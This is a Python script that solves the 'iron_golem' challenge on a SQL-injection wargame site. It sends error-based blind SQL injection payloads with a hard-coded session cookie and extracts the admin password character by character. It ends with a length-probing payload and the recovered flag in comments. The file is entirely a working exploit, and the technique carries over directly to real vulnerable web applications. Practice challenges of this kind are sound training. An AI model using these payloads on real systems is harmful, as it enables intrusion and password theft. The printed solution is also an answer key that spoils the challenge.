import requests
url = 'https://los.rubiya.kr/chall/iron_golem_beb244fe41dd33998ef7bb4211c56c75.php'
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36'}
cookies = {'PHPSESSID': '93pnoqudnpibardn1ivhj99sgp'}
length = 32
flag = ""
for i in range(1,length+1):
    for j in range(48,127):
        try:
            query=url + "?pw=1' or id='admin' and if(ord(mid(pw,"+str(i)+",1))="+str(j)+",(select 1 union select 2),2)--%20"
            response = requests.get(query, cookies=cookies)
        except:
            print("[-]Error occur!")
            continue
        html_data = response.text
        print(response.url)
        if ("Subquery returns more than 1 row" in html_data):
            print ("[+]Find Key : " + chr(j))
            flag += chr(j)
            break
print (flag)
    
#1%27%20or%20if(length(pw)=32,(select%201%20union%20select%202),2)%23

#sovle 06b5a6c16e8830475f983cc3a825ee9a
